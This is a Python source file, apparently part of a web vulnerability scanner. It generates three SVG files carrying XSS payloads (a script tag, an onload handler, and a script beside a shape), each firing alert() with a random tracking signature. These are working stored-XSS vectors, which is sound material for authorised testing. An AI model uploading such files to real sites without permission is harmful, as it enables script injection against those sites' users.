

import random
import string


class SVGXSS:
    def __init__(self):
        self.signature = self.generate_signature()


    def generate_signature(self):
        return "XSS_" + ''.join(random.choices(string.ascii_uppercase, k=5))

  
    def basic_svg(self):
        content = f"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert('{self.signature}')</script>
</svg>
"""
        filename = f"xss_{self.signature}.svg"
        return filename, content.encode()


    def onload_svg(self):
        content = f"""<svg xmlns="http://www.w3.org/2000/svg" onload="alert('{self.signature}')">
</svg>
"""
        filename = f"xss_onload_{self.signature}.svg"
        return filename, content.encode()


    def image_svg(self):
        content = f"""<svg xmlns="http://www.w3.org/2000/svg">
<rect width="100" height="100" fill="blue"/>
<script>alert('{self.signature}')</script>
</svg>
"""
        filename = f"xss_img_{self.signature}.svg"
        return filename, content.encode()

 
    def generate_payloads(self):
        payloads = []

        for func in [self.basic_svg, self.onload_svg, self.image_svg]:
            filename, content = func()

            payloads.append({
                "filename": filename,
                "content": content,
                "signature": self.signature,
                "type": "svg_xss"
            })

        return payloads
